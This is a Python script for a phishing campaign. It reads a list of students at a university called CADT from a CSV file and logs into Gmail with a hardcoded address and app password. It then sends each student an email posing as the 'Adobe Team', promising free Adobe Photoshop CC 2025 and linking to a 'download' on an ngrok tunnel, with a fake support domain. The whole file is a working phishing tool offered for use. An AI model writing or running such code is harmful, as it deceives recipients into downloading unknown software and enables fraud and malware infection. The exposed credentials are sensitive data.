import smtplib
import ssl
import time
import csv
import os
import subprocess
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ===== CONFIGURATION =====
CSV_FILE = 'email_dataset.csv'
SENDER_EMAIL = "yo4tube.company168@gmail.com"
SENDER_PASSWORD = "nabzxqwuyngaqvym"

# =====================================================
# NGROK URL CONFIGURATION
# =====================================================
# Option 1: Set your ngrok URL manually here
# NGROK_URL = "https://abc123.ngrok-free.app"

# Option 2: Auto-detect from ngrok API (if ngrok is running)
NGROK_URL = None  # Will be auto-detected

def get_ngrok_url():
    """Try to automatically get the ngrok URL from the local API."""
    try:
        import urllib.request
        import json
        # ngrok exposes an API at localhost:4040
        response = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=3)
        data = json.loads(response.read().decode())
        for tunnel in data.get("tunnels", []):
            if tunnel.get("proto") == "https":
                return tunnel.get("public_url")
        # If no https, try http
        for tunnel in data.get("tunnels", []):
            return tunnel.get("public_url")
    except Exception as e:
        pass
    return None

# Try to auto-detect ngrok URL
if NGROK_URL is None:
    print("🔍 Attempting to auto-detect ngrok URL...")
    NGROK_URL = get_ngrok_url()
    
if NGROK_URL:
    print(f"✅ Detected ngrok URL: {NGROK_URL}")
    DOWNLOAD_LINK = f"{NGROK_URL}/download"
else:
    print("⚠️  Could not auto-detect ngrok URL!")
    print()
    print("   Please enter your ngrok URL manually.")
    print("   Example: https://abc123.ngrok-free.app")
    print()
    manual_url = input("Enter ngrok URL (or press Enter to use localhost): ").strip()
    if manual_url:
        if not manual_url.startswith("http"):
            manual_url = "https://" + manual_url
        NGROK_URL = manual_url
        DOWNLOAD_LINK = f"{NGROK_URL}/download"
    else:
        DOWNLOAD_LINK = "http://localhost:3000/download"
        print("   Using localhost (only works on same machine)")

print(f"📥 Download link: {DOWNLOAD_LINK}")
print()
# =====================================================

SUPPORT_MESSAGE = "For support, reply to this email or contact us at support@adobe-students.com"
YOUR_NAME = "Adobe Team"  # Your name/team name

# ===== READ CLASSMATES LIST =====
print("📋 Reading classmates list...")
classmates = []
try:
    with open(CSV_FILE, 'r') as file:
        reader = csv.DictReader(file)
        for row in reader:
            if 'email' in row and 'name' in row:
                classmates.append({
                    'email': row['email'].strip(),
                    'name': row['name'].strip()
                })
    
    if not classmates:
        print("❌ No classmates found in CSV!")
        exit()
    
    print(f"✅ Found {len(classmates)} classmates")
    
except Exception as e:
    print(f"❌ Error reading CSV: {e}")
    exit()

# ===== SEND EMAILS =====
success = 0
failed = []

print(f"\n🚀 Starting to send {len(classmates)} emails to CADT students...")
print("="*50)

try:
    # Connect to Gmail
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls(context=ssl.create_default_context())
    server.login(SENDER_EMAIL, SENDER_PASSWORD)
    print("✅ Connected to Gmail")
    
    for i, student in enumerate(classmates):
        print(f"\n[{i+1}/{len(classmates)}] Sending to {student['name']}...")
        
        try:
            # Create email
            msg = MIMEMultipart("alternative")
            msg["Subject"] = f"� Exclusive Offer for CADT Students: Adobe Photoshop CC 2025 FREE!"
            msg["From"] = f"Adobe Team <{SENDER_EMAIL}>"
            msg["To"] = student['email']
            msg["Reply-To"] = SENDER_EMAIL
            
            # Extract first name (assuming format is "LAST FIRST" or "FIRST LAST")
            full_name = student['name']
            # Try to get first name - split and take last part (usually first name in Cambodian format)
            name_parts = full_name.split()
            first_name = name_parts[-1] if name_parts else full_name
            
            # Text version
            text = f"""Hi {first_name},

As a fellow CADT student, I wanted to share this exclusive Adobe Photoshop offer!

Get Adobe Photoshop CC 2025 completely FREE:
✓ Professional photo editing tools
✓ AI-powered features
✓ Cloud storage included
✓ Regular updates

Perfect for your design projects and assignments!

Download here: {DOWNLOAD_LINK}

{SUPPORT_MESSAGE}

This offer is exclusive for students. Enjoy!

Best regards,
Adobe Team
CADT Student Offer"""
            
            # HTML version
            html = f"""<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Photoshop CC 2025 Offer for CADT Students</title>
</head>
<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #001e36 0%, #003366 100%); margin: 0; padding: 20px;">
<div style="max-width: 600px; margin: 20px auto; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
    
    <!-- Header -->
    <div style="text-align: center; margin-bottom: 30px;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Adobe_Photoshop_CC_icon.svg/512px-Adobe_Photoshop_CC_icon.svg.png" alt="Adobe Photoshop" style="width: 80px; height: 80px; margin-bottom: 15px;">
        <div style="display: inline-block; background: #31a8ff; color: white; padding: 10px 20px; border-radius: 50px; font-weight: bold; margin-bottom: 15px;">
            🎓 CADT STUDENT EXCLUSIVE
        </div>
        <h1 style="color: #333; margin: 10px 0 5px 0;">Hi {first_name}! 👋</h1>
        <p style="color: #666; margin: 0;">Special offer for CADT students only</p>
    </div>
    
    <!-- Main Offer -->
    <div style="background: linear-gradient(135deg, #31a8ff 0%, #0078d7 100%); color: white; padding: 30px; border-radius: 12px; margin: 25px 0; text-align: center;">
        <h2 style="margin: 0 0 15px 0; font-size: 28px;">🎁 FREE Download</h2>
        <h3 style="margin: 0 0 20px 0; font-size: 22px;">Adobe Photoshop CC 2025</h3>
        
        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 25px 0;">
            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
                <div style="font-size: 24px; margin-bottom: 8px;">🖼️</div>
                <p style="margin: 0; font-size: 14px;">Photo Editing</p>
            </div>
            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
                <div style="font-size: 24px; margin-bottom: 8px;">🤖</div>
                <p style="margin: 0; font-size: 14px;">AI Features</p>
            </div>
            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
                <div style="font-size: 24px; margin-bottom: 8px;">☁️</div>
                <p style="margin: 0; font-size: 14px;">Cloud Storage</p>
            </div>
            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
                <div style="font-size: 24px; margin-bottom: 8px;">�</div>
                <p style="margin: 0; font-size: 14px;">Free Updates</p>
            </div>
        </div>
        
        <p style="margin: 20px 0 0 0; opacity: 0.9; font-size: 14px;">
            Regular price: $22.99/month • Student offer: FREE
        </p>
    </div>
    
    <!-- Download Button -->
    <div style="text-align: center; margin: 35px 0;">
        <a href="{DOWNLOAD_LINK}" 
           style="background: linear-gradient(135deg, #31a8ff 0%, #0078d7 100%); 
                  color: white; 
                  padding: 18px 50px; 
                  text-decoration: none; 
                  border-radius: 10px; 
                  font-weight: bold; 
                  font-size: 18px; 
                  display: inline-block;
                  box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
                  transition: all 0.3s;
                  border: none;
                  cursor: pointer;">
            🚀 DOWNLOAD NOW
        </a>
        <p style="color: #666; font-size: 13px; margin-top: 12px;">
            Windows & macOS Compatible • Exclusive CADT Student Access
        </p>
    </div>
    
    <!-- Student Benefits -->
    <div style="background: #f8f9fa; padding: 25px; border-radius: 10px; margin: 25px 0; border-left: 5px solid #31a8ff;">
        <h3 style="color: #333; margin-top: 0;">🎓 Perfect for Students:</h3>
        <ul style="color: #555; line-height: 1.8; padding-left: 20px;">
            <li>✓ Create stunning designs for projects</li>
            <li>✓ Edit photos professionally</li>
            <li>✓ Learn industry-standard tools</li>
            <li>✓ Build your portfolio</li>
        </ul>
    </div>
    
    <!-- Support Section -->
    <div style="text-align: center; padding: 25px; background: linear-gradient(135deg, #001e36 0%, #003366 100%); color: white; border-radius: 10px; margin: 25px 0;">
        <h3 style="margin-top: 0; color: white;">💬 Need Help?</h3>
        <p style="opacity: 0.9; margin-bottom: 10px;">{SUPPORT_MESSAGE}</p>
        <p style="opacity: 0.8; font-size: 14px;">We're here to help CADT students!</p>
    </div>
    
    <!-- Footer -->
    <div style="text-align: center; padding-top: 25px; border-top: 1px solid #eee; margin-top: 30px;">
        <p style="color: #888; font-size: 12px; line-height: 1.6; margin: 0;">
            This is an exclusive offer for CADT University students only.<br>
            Offer valid for limited time. One redemption per student.<br><br>
            Adobe and the Adobe logo are trademarks of Adobe Inc.<br>
            <span style="color: #666; font-size: 11px;">Sent with ❤️ to CADT students</span>
        </p>
    </div>
    
</div>
</body>
</html>"""
            
            # Attach both versions
            msg.attach(MIMEText(text, "plain"))
            # msg.attach(MIMEText(html, "html"))  # HTML disabled - causes delivery issues
            
            # Send
            server.sendmail(SENDER_EMAIL, student['email'], msg.as_string())
            success += 1
            print(f"   ✅ Sent to {student['name']}")
            
            # Wait between emails (avoid Gmail rate limits)
            if i < len(classmates) - 1:
                wait_time = 3  # seconds between emails
                print(f"   ⏳ Waiting {wait_time} seconds...")
                time.sleep(wait_time)
                
        except Exception as e:
            print(f"   ❌ Failed for {student['name']}: {str(e)[:80]}")
            failed.append(student['email'])
            time.sleep(5)  # Wait longer on error
    
    # Close connection
    server.quit()
    print("\n🔒 Connection closed")
    
except Exception as e:
    print(f"\n❌ Connection error: {e}")

# ===== RESULTS =====
print("\n" + "="*50)
print("📊 EMAIL CAMPAIGN RESULTS")
print("="*50)
print(f"✅ Successfully sent: {success}/{len(classmates)}")
print(f"❌ Failed to send: {len(failed)}")

if failed:
    print("\n📝 Failed emails (save this list):")
    for email in failed:
        print(f"  - {email}")
    
    # Option to save failed emails to file
    save_failed = input("\n💾 Save failed emails to file? (y/n): ")
    if save_failed.lower() == 'y':
        with open('failed_emails.txt', 'w') as f:
            for email in failed:
                f.write(email + '\n')
        print("📁 Saved to 'failed_emails.txt'")

print(f"\n🎉 Campaign completed!")
print("="*50)
print("\n📌 IMPORTANT NOTES:")
print("1. Check your sent folder in Gmail to verify")
print("2. Some emails may go to spam - ask friends to check")
print("3. Gmail daily limit: ~500 emails")
print("4. Failed emails can be retried later")
print("="*50)